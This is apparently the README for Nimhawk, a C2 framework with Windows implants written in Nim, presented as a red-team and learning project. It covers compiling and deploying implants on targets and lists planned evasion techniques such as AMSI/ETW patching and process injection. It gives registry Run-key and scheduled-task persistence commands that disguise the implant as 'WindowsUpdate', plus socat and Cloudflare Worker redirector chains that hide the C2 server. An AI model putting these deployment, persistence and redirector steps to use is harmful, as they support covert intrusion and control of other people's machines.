Note: The implant is currently developed and tested exclusively for 64-bit Windows environments. Support for other platforms is on the roadmap but not currently available.

### Cross-compiling with nim.cfg

For building Windows payloads from Linux or macOS, Nimhawk uses cross-compilation configured through `nim.cfg`:

1. **Install MinGW toolchain**:
   ```bash
   # On macOS
   brew install mingw-w64
   
   # On Linux (Debian/Ubuntu)
   apt-get install mingw-w64
   ```

2. **nim.cfg configuration**:
   The nim.cfg file contains platform-specific settings for cross-compilation. Key components include:
   ```
   # Set target OS to Windows
   os = windows
   
   # 32-bit Windows compilation settings
   i386.windows.gcc.path = "/path/to/mingw/bin"
   i386.windows.gcc.exe = "i686-w64-mingw32-gcc"
   i386.windows.gcc.linkerexe = "i686-w64-mingw32-gcc"
   
   # 64-bit Windows compilation settings
   amd64.windows.gcc.path = "/path/to/mingw/bin"
   amd64.windows.gcc.exe = "x86_64-w64-mingw32-gcc"
   amd64.windows.gcc.linkerexe = "x86_64-w64-mingw32-gcc"
   
   # Assembly and linker options
   --passC:"-masm=intel"
   --passL:"-Wl,--image-base" 
   --passL:"-Wl,0x400000"
   ```

3. **Troubleshooting cross-compilation**:
   - If you encounter errors, verify the paths to your MinGW toolchain
   - On macOS, you may need to update paths in nim.cfg based on your Homebrew installation
   - Use `which x86_64-w64-mingw32-gcc` to locate the correct path to MinGW toolchain binaries

The cross-compilation setup allows you to develop and build Windows implants from non-Windows systems, which is particularly useful for red team operations conducted from Linux or macOS environments.

## New structure and improvements

Nimhawk introduces important structural changes compared to NimPlant:

1. **Directory reorganization**:
   - Clear separation between server (`server`) and web interface (`admin_web_ui`)
   - Modules organized by functionality
   - Scalable structure to facilitate development

2. **Agent improvements**:
   - Reconnection system with exponential backoff
   - Secure encryption key transfer
   - Mutex to prevent multiple executions
   - Enhanced registry management with proper cleanup during reconnection
   - Robust error handling for network disconnection scenarios

3. **Modern web interface**:
   - Login authentication
   - Responsive and improved design
   - Web panel for implant compilation
   - Real-time visualization of information and results
   - Enhanced implant details with relevant metrics

4. **Advanced security**:
   - Dual authentication system:
     - Web UI/API authentication with user accounts and session management
     - Implant-server authentication using custom HTTP headers (`X-Correlation-ID`) and communication keys
   - Encryption of all communications
   - Compression for large data transfers (files, screenshots, assemblies)
   - Validation mechanisms to prevent unauthorized connections

5. **Database optimizations**:
   - Improved schema for check-in tracking
   - More efficient data storage and retrieval
   - Better separation of command history and system events

### Authentication system

Nimhawk includes a complete authentication system with the following features:

- **Web UI authentication**: Username/password login for access to the admin interface
- **Session management**: Configurable session duration with automatic expiration
- **Multi-user support**: Configure multiple users with different permission levels
- **API authentication**: Session-based authentication for all API endpoints
- **Implant authentication**: Separate machine-to-machine authentication for implants using `httpAllowCommunicationKey`

By default, a user account is created with the credentials:
- Email: `admin@nimhawk.com`
- Password: `P4ssw0rd123$`

It is strongly recommended to change these default credentials in your production environment.

## Quick start guide

### Implant compilation

The web panel facilitates the generation of implants with different configurations:

1. Access the "Server" section in the web interface
2. Use the "Compile Implants" button to open the panel
3. Configure options as needed (debug/release)
4. Click "Build" to generate the implant

Alternatively, you can use the `nimhawk.py` script:

```bash
python3 nimhawk.py compile [exe|dll|raw|all] nim-debug
```

### Starting the server

To start the Nimhawk server:

```bash
python3 nimhawk.py server

or

cd server/
python3 main.py Nimhawk
```

This will start both the Implant API server and the Admin API server on the configured ports.

</div>

- **Advanced Evasion Techniques**:
   - NTDLL Unhook
   - AMSI and ETW patching/bypassing mechanisms (I need to improve this)   
   - Sleep obfuscation techniques - Ekko is on place by @chvancooten
   - Memory payload protection (encryption at rest)

- **Stealthiness Analysis Tools**:
   - The `detection` folder currently contains Nimplant detection rules, not Nimhawk-specific ones.
   - Future development will transform this directory into a comprehensive toolkit with:
     - PE-sieve integration for in-memory analysis
     - ThreatCheck-style functionality for pinpointing detection signatures
     - Automated YARA rule generation and testing
   - These tools will make it easier to analyze and improve the stealthiness of implants

- **Payload Delivery Mechanisms**:
   - In the future we will include different loaders in the building process for the following techniques:
       - Classic DLL Injection
       - Remote Shellcode Injection
         - VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
         - NtCreateThreadEx for more stealth operations
         - Section mapping techniques
       - Process Hollowing with advanced unmapping techniques
       - Thread Hijacking with context manipulation
       - APC Injection (standard and early bird variants)
       - Early Bird Injection with queue exploitation
       - Local NTDLL Unhooking with PE header parsing
       - Remote NTDLL Unhooking for cross-process hook removal
       - Waiting Thread Hijacking with suspending mechanisms
       - Module Stomping and PE section manipulation
       - COM Hijacking techniques

- **Defense Evasion**:
   - Anti-sandbox detection techniques
   - Anti-analysis countermeasures
   - Stack spoofing for hiding call stacks

## Research and inspiration

Nimhawk draws inspiration from various offensive security projects and research:

- Cobalt Strike's Beacon architecture for C2 communications
- Outflank's excellent research on in-memory execution
- MDSec's creative approaches to defense evasion
- Sektor7's comprehensive training materials
- Process Injection research by The DFIR Report, Elastic, and Huntress
- Modern offensive tooling like Sliver, Havoc, and Brute Ratel

The project aims to incorporate best practices from these sources while contributing new techniques and approaches to the field.

## Notes and considerations

- Nimhawk implants use custom headers for authentication:
  - `X-Request-ID`: Carries the implant's UUID
  - `Content-MD5`: Carries task ID for job executions
  - `X-Correlation-ID`: Carries the HTTP communication key
  - `X-Robots-Tag`: Carries the Workspace UUID for workspace association

- Nimhawk is an actively developing project; it is recommended to review the technical documentation for implementations in sensitive environments.

## FAQ

### General questions

#### What is Nimhawk?
Nimhawk is a Command & Control (C2) framework designed for red team operations, featuring a Python backend server and implants written in the Nim programming language.

#### How is Nimhawk different from other C2 frameworks?
It does not really do. I created it primarily to improve my own malware development skills and share the learning journey with others. If you're interested in understanding how C2s work or want to learn Nim for security development, this project's documentation and code will be helpful. And hey, if you're into malware development for research or defense, feel free to learn from my mistakes!

#### Is Nimhawk free to use?
Yes, Nimhawk is open-source and free to use under the terms specified in the license. However, it's designed for legitimate security testing with proper authorization.

### Technical questions

#### What platforms does the implant support?
Currently, Nimhawk implants only work on Windows x64 environments (Windows 7 SP1 and newer). There are no plans to support 32-bit Windows, though macOS and Linux support may be added in the future.

#### Can I compile implants on my Mac/Linux machine?
Yes, you can cross-compile Windows implants from Linux or macOS using the MinGW toolchain. The `nim.cfg` file contains the necessary configuration for cross-compilation.

#### Does Nimhawk support HTTPS communications?
Yes, Nimhawk supports both HTTP and HTTPS communications. For HTTPS, you'll need to configure SSL certificates in the `config.toml` file.

#### How do I customize the C2 communication paths?
You can customize all communication paths (register, task, result, reconnect) in the `config.toml` file under the `[implants_server]` section.

#### How does the authentication system work?
Nimhawk has a dual authentication system:
1. Web UI authentication using username/password for operators
2. Implant-server authentication using a pre-shared key (httpAllowCommunicationKey) and custom HTTP headers

### Operational questions

#### How do I create and deploy an implant?
1. Configure your `config.toml` file
2. Use the web interface "Compile Implants" button or run `python3 nimhawk.py compile [exe|dll|raw|all] nim-debug` 
3. Deploy the generated implant on your target system

#### What are the implant's persistence capabilities?
Currently, persistence must be manually implemented using standard Windows persistence techniques (Registry, Scheduled Tasks, Services). The implant itself does not have built-in persistence mechanisms.

#### How can I contribute to Nimhawk?
Contributions are welcome! Check DEVELOPERS.md file for guidelines on contributing to the project.

Nimhawk uses a basic client-server architecture - nothing groundbreaking, but it gets the job done:

1. **Implant (The Agent)**:
   - Written in Nim because I wanted to improve my maldev skills in this language
   - Some evasion tricks I learned along the way
   - Easy to extend if you want to add your own commands (it would be amazing if you join the Nimhawk Army!)
   - Uses XOR encryption (yeah, I know, but it works - Make it work, later you can make it better!)

2. **Backend (The Server Stuff)**:
   - **Admin API**:
     - Regular REST API with some basic auth
     - Nothing fancy, just the basics that work
   
   - **Implant Server**:
     - Handles the implants' check-ins and tasks
     - Simple queue system for commands
     - Basic status tracking
     - Auto-reconnect when things break
     - basic http auth through machine to machine tokens

3. **Web UI (The Pretty Part)**:
   - React because... well, it's React
   - Real-time updates (when they work)
   - Web-based implant builder

4. **Database**:
   - Just SQLite - keeping it simple
   - Stores implant info and commands
   - Some basic file handling

5. **Security Stuff**
   - Custom headers for implants
   - Some anti-debug tricks
   - Basic encryption
   - Nothing revolutionary, but secure enough for learning

6. **Dev Features**
   - Logs everything (maybe too much)
   - Good documentation
   - Code that works or must do!

### Persistence (Optional)

Establishing persistence for longer engagements:

```bash
# Registry persistence
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\user\Documents\update.exe" /f

# Scheduled task
shell schtasks /create /sc minute /mo 30 /tn "WindowsUpdate" /tr "C:\Users\user\Documents\update.exe" /f
```

Probably you will need to add a loader at the moment, if you know what is a Loader well done!
But if you don't, I recommend checking out [Maldev Academy](https://maldevacademy.com/) and [Sektor7](https://institute.sektor7.net/).

# Docker Support

Nimhawk provides official Docker support for easy deployment and consistent environment across different systems.

## Building the Docker Image

Build the Nimhawk Docker image with:

```bash
docker build -t nimhawk .
```

## Running Nimhawk in Docker

The container supports multiple operation modes:

```bash
docker run -it -p 3000:3000 -p 9669:9669 -p 80:80 -p 443:443 \
  -v nimhawk-data:/nimhawk/server \
  nimhawk full
```

### Available Commands

```
server    - Start the Nimhawk server through nimhawk.py (generates .xorkey file)
compile   - Compile implants (e.g., docker run nimhawk compile exe nim-debug)
frontend  - Start only the frontend dev server
full      - Start both backend and frontend servers
shell     - Start an interactive shell
help      - Show this help message
```

### Port Mapping

The exposed ports must match those configured in your `config.toml` file:
- `3000`: Frontend React application
- `9669`: Admin API server (as configured in `admin_api.port`)
- `80`: Default HTTP listener for implants (as configured in `implants_server.port`)
- `443`: HTTPS listener (only needed if using HTTPS in `implants_server.type`)

### Important Notes

- The `-it` flags are **required** for proper console interaction with the Nimhawk server, as it relies on interactive terminal input.
- Using the `server` command will generate a new XOR key file for encryption.
- The `full` command is recommended for most users as it starts both backend and frontend.

### Examples

```bash
# Start full Nimhawk (backend + frontend)
docker run -it -p 3000:3000 -p 9669:9669 -p 80:80 -p 443:443 nimhawk full

# Compile implants only
docker run -it nimhawk compile all

# Compile implants in debug mode
docker run -it nimhawk compile all nim-debug

# Launch an interactive shell in the container
docker run -it nimhawk bash
```

### Persistent Storage

For persistent data storage, mount a volume to preserve the database:

```bash
docker run -it -p 3000:3000 -p 9669:9669 -p 80:80 -p 443:443 \
  -v nimhawk-data:/nimhawk/server \
  nimhawk full
```

This ensures your implant data, command history, and files remain available between container restarts.

# Frontend Configuration for Client - Server Execution

Nimhawk supports deployment configurations where frontend and backend run on different servers. This is configured through the `.env` file in the `server/admin_web_ui` directory.

## The `.env` File

```
SERVER_IP=https://nimhawk-backend.example.com
SERVER_PORT=9669
IMPLANT_SERVER_IP=https://implant-listener.example.com
IMPLANT_SERVER_PORT=443
```

### Configuration Options

- `SERVER_IP`: URL of the Admin API server (backend)
- `SERVER_PORT`: Port of the Admin API server (must match `admin_api.port` in `config.toml`)
- `IMPLANT_SERVER_IP`: URL of the implant listener (typically same as SERVER_IP)
- `IMPLANT_SERVER_PORT`: Port for implant communications (must match `implants_server.port` in `config.toml`)

### Docker Deployment

For Docker deployments, you can use the default configuration as the container handles proper routing between components. No changes to the `.env` file are necessary unless you're exposing the services on different ports.

### Distributed Deployment

When running the frontend and backend on separate servers or cloud services:

1. Create or modify the `.env` file in the `server/admin_web_ui` directory
2. Configure `SERVER_IP` to point to your backend server (e.g., `https://nimhawk-backend.example.com`)
3. Ensure `SERVER_PORT` matches your backend's exposed port
4. Update `IMPLANT_SERVER_IP` and `IMPLANT_SERVER_PORT` to direct implants to the correct implants listener (in general, it will be the same SERVER_IP but in other port.)

### Example for Distributed Setup

```
SERVER_IP=https://nimhawk-backend.example.com
SERVER_PORT=9669
IMPLANT_SERVER_IP=https://nimhawk-backend.example.com
IMPLANT_SERVER_PORT=443
```

This configuration allows you to host the UI on a separate service from the backend, which can be useful for scaling, security segregation, or cloud-based deployments.


# Redirector Setup

In this section, we will explain how to configure multiple redirectors theoretically. This system has not been tested in production yet, but it should work according to traffic redirection principles. Redirectors act as intermediaries between the implant and the C2 server, helping to protect the actual server infrastructure.

## Basic Redirector Setup

The simplest way to set up a redirector is using socat:

```bash
# Install socat
apt-get install socat

# Basic HTTP redirector
# Listens on port 80 and redirects all traffic to C2 server at 192.168.1.100:80
socat TCP4-LISTEN:80,fork TCP4:192.168.1.100:80

# HTTPS redirector (requires SSL certificate)
# Listens on port 443 and redirects to C2 server at 192.168.1.100:443
socat OPENSSL-LISTEN:443,fork,reuseaddr,cert=server.pem,verify=0 TCP4:192.168.1.100:443
```

## Advanced Redirector Configuration

For more sophisticated setups, you can use socat with additional options:

```bash
# Redirector with logging
# Listens on 192.168.1.200:80, redirects to 192.168.1.100:80 and saves logs
socat TCP4-LISTEN:80,fork,reuseaddr TCP4:192.168.1.100:80 | tee -a /var/log/redirector.log

# Redirector with header modification
# Listens on 192.168.1.200:80 and modifies Host header before redirecting
socat TCP4-LISTEN:80,fork,reuseaddr \
  SYSTEM:'while read line; do \
    if [[ $line =~ ^Host: ]]; then \
      echo "Host: 192.168.1.100"; \
    else \
      echo "$line"; \
    fi; \
  done' \
  TCP4:192.168.1.100:80
```

## Cloudflare worker redirector

For a more resilient and distributed setup, you can use Cloudflare Workers:

```javascript
// Cloudflare Worker code for redirector
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // Modify headers as needed if you need it.
  const headers = new Headers(request.headers)
  headers.set('X-Forwarded-For', '192.168.1.100')
  
  // Forward request to C2 server
  const response = await fetch('https://192.168.1.100', {
    method: request.method,
    headers: headers,
    body: request.body
  })
  
  return response
}
```

## Redirector Chain

For additional security, you can chain multiple redirectors:

```
Implant -> Redirector1 (192.168.1.100) -> Redirector2 (192.168.1.150) -> C2 Server (192.168.1.200)
```

```bash
# First redirector (192.168.1.100)
# Listens on port 80 and redirects to second redirector
socat TCP4-LISTEN:80,fork,reuseaddr TCP4:192.168.1.150:80

# Second redirector (192.168.1.150)
# Listens on port 80 and redirects to final C2 server
socat TCP4-LISTEN:80,fork,reuseaddr TCP4:192.168.1.200:80
```

## Security Considerations

When using multi chain redirectors:

1. **IP Whitelisting**: Configure firewall rules to create a secure chain:
   ```bash
   # On Redirector1 (192.168.1.100) - Accepts all connections, this server will be the one used in Implant `callBackIP` in config.toml
   iptables -A INPUT -p tcp --dport 80 -j ACCEPT   # Allow all incoming HTTP traffic
   iptables -A INPUT -p tcp --dport 443 -j ACCEPT  # Allow all incoming HTTPS traffic

   # On Redirector2 (192.168.1.150) - Only accepts from Redirector1
   iptables -A INPUT -p tcp -s 192.168.1.100 --dport 80 -j ACCEPT   # Allow HTTP from Redirector1
   iptables -A INPUT -p tcp -s 192.168.1.100 --dport 443 -j ACCEPT  # Allow HTTPS from Redirector1
   iptables -A INPUT -p tcp --dport 80 -j DROP   # Block all other HTTP traffic
   iptables -A INPUT -p tcp --dport 443 -j DROP  # Block all other HTTPS traffic

   # On C2 Server (192.168.1.200) - Only accepts from Redirector2
   iptables -A INPUT -p tcp -s 192.168.1.150 --dport 80 -j ACCEPT   # Allow HTTP from Redirector2
   iptables -A INPUT -p tcp -s 192.168.1.150 --dport 443 -j ACCEPT  # Allow HTTPS from Redirector2
   iptables -A INPUT -p tcp --dport 80 -j DROP   # Block all other HTTP traffic
   iptables -A INPUT -p tcp --dport 443 -j DROP  # Block all other HTTPS traffic
   ```

2. **Logging**: Enable logging to monitor traffic patterns
   ```bash
   # Monitor active connections
   watch -n 1 "netstat -an | grep :80"
   
   # View logs in real-time
   tail -f /var/log/redirector.log
   ```

3. **SSL/TLS**: Use HTTPS redirectors with proper certificates
   ```bash
   # Generate SSL certificate on Operator machine
   openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
   
   # Start HTTPS redirector on Redirector1 (exposed to agents)
   socat OPENSSL-LISTEN:443,fork,reuseaddr,cert=cert.pem,verify=1 \
     TCP4:192.168.1.150:443 | tee -a /var/log/redirector1.log

   # Start HTTPS redirector on Redirector2 (only accepts from Redirector1)
   socat OPENSSL-LISTEN:443,fork,reuseaddr,cert=cert.pem,verify=1 \
     TCP4:192.168.1.200:443 | tee -a /var/log/redirector2.log

   # On C2 Server (192.168.1.200)
   # Configure firewall to only accept from Redirector2
   iptables -A INPUT -p tcp -s 192.168.1.150 --dport 443 -j ACCEPT
   iptables -A INPUT -p tcp --dport 443 -j DROP

   # Configure C2 server in config.toml
   [server]
   sslCert = "cert.pem"
   sslKey = "key.pem"
   sslVerify = true  # Enable SSL verification
   ```

## Complete Deployment example

Here's a complete example of setting up the redirector chain:

```bash

# Create SSL certificate on Operator machine:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# On Redirector1 (192.168.1.100) - Exposed to agents
apt-get update
apt-get install socat

# Configure firewall to accept all connections (Not always needed)
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# Start HTTPS redirector
socat OPENSSL-LISTEN:443,fork,reuseaddr,cert=cert.pem,key=key.pem,verify=0 \
  TCP4:192.168.1.150:443 | tee -a /var/log/redirector1.log

# On Redirector2 (192.168.1.150) - Start Redirector 1 and only accepts from Redirector1
apt-get update
apt-get install socat

# Configure firewall to only accept from Redirector1 (Optional)
iptables -A INPUT -p tcp -s 192.168.1.100 --dport 443 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j DROP

# Start HTTPS redirector
socat OPENSSL-LISTEN:443,fork,reuseaddr,cert=cert.pem,key=key.pem,verify=0 \
  TCP4:192.168.1.200:443 | tee -a /var/log/redirector2.log

# On C2 Server (192.168.1.200) - Only accepts from Redirector2  (Optional)
# Configure firewall to only accept from Redirector2
iptables -A INPUT -p tcp -s 192.168.1.150 --dport 443 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j DROP

# Configure C2 server in config.toml
   [server]
   sslCert = "cert.pem"
   sslKey = "key.pem"
   sslVerify = true  # Enable SSL verification
```

## Opening HTTP Redirector with socat

To start a basic HTTP redirector with socat:

```bash
# Basic HTTP redirector
# Listens on port 80 and redirects all traffic to C2 server at 192.168.1.200:80
socat TCP4-LISTEN:80,fork TCP4:192.168.1.200:80

# HTTP redirector with logging
# Listens on 192.168.1.100:80, redirects to 192.168.1.200:80 and saves logs
socat TCP4-LISTEN:80,fork,reuseaddr TCP4:192.168.1.200:80 | tee -a /var/log/redirector.log

# HTTP redirector with header modification
# Listens on 192.168.1.100:80 and modifies Host header before redirecting
socat TCP4-LISTEN:80,fork,reuseaddr \
  SYSTEM:'while read line; do \
    if [[ $line =~ ^Host: ]]; then \
      echo "Host: 192.168.1.200"; \
    else \
      echo "$line"; \
    fi; \
  done' \
  TCP4:192.168.1.200:80
```

### Example Deployment

```bash
# On redirector server (192.168.1.100) - exposed to implants 
apt-get update
apt-get install socat

# Configure firewall to allow HTTP traffic
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# Start HTTP redirector with logging
socat TCP4-LISTEN:80,fork,reuseaddr TCP4:192.168.1.200:80 | tee -a /var/log/redirector.log

# On C2 Server (192.168.1.200) - Only accepts from Redirector (Optional)
iptables -A INPUT -p tcp -s 192.168.1.100 --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j DROP

```

## Implant Configuration for HTTP or HTTPS

Remember to update the implant configuration to point to the first redirector:

```toml
# In config.toml
[implant]
listenerIp = "192.168.1.100"  # First redirector IP (exposed to implants)
```

### Monitoring Redirector

```bash
# Monitor active connections
watch -n 1 "netstat -an | grep :80"

# View redirector logs
tail -f /var/log/redirector.log
```
